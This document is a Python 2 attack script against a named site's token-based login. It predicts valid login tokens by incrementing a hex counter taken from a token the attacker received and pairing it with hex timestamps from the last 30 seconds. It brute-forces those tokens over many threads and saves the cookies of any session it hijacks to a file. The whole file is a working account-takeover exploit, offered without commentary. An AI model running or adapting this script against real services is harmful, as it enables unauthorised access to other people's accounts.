#!/usr/bin/python

import mechanize
from BeautifulSoup import BeautifulSoup
import cookielib
from time import sleep
import threading
import logging
import time

logging.basicConfig(level=logging.DEBUG, format='[%(levelname)s] (%(threadName)s) %(message)s')
base = 'https://www.ascendantcompliancemanager.com/'
win = 0

def bro(url):
  cj = cookielib.LWPCookieJar() # cookiejar for browser
  br = mechanize.Browser()
  br.set_handle_robots(False)
  br.set_handle_refresh(True)
  br.set_handle_redirect(True)
  br.set_handle_gzip(True)
  br.set_cookiejar(cj)
  #br.set_proxies({'https': '192.168.60.1:8888'})
  br.addheaders=[('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0')]

  resp = ""
  try:
    resp = br.open(url)
  except (mechanize.HTTPError) as err:
    print err
    sleep(3)
    bro(url)

  return (resp, cj)

def add_token(token):
  ttoken = token

  ntoken = int(ttoken, 16) + 1
  ntoken2 = '%x' % ntoken

  return ntoken2

def get_tokens():
  basetoken = raw_input("Enter the token received: ")
  basetoken = basetoken.rstrip()

  token1 = basetoken[:8]
  token2 = basetoken[8:]

  return (token1, token2)

def try_tokens(token1, token2):
  global win
  url = base+"login-token?token="+token1+token2
  resp, cj = bro(url)
  resp = BeautifulSoup(resp)

  if ("ACM: Sign In" in resp.title):
    logging.debug("failed")
  else:
    logging.debug("!!!!! Won with: "+token1+token2+" !!!!!")
    win = 1
    cj.save('/client/'+token1+token2+'.txt', ignore_discard=True)
    return True

  return False

def gen_tokens():
  now = int(time.time())
  then = now-30
  tokens = []
  
  for ntoken in range(then, now+1):
    ntoken2 = '%x' % ntoken
    tokens.append(ntoken2)

  return tokens

tokens = get_tokens()
token2 = tokens[1]

while win == 0:
  token2n = add_token(token2)
  token1n = gen_tokens()

  threads = []
  for token in token1n:
    t = threading.Thread(name=token, target=try_tokens, args=(token, token2n))
    t.setDaemon(True)
    t.start()
    threads.append(t)
    logging.debug("Starting thread: "+token)

  while int(threading.activeCount()) > 1:
    pass

  if (win == 1):
    ans = raw_input("Keep Playing? ")
    if ("y" in ans.lower()):
      win = 0
      token2 = token2n

print "Done!"
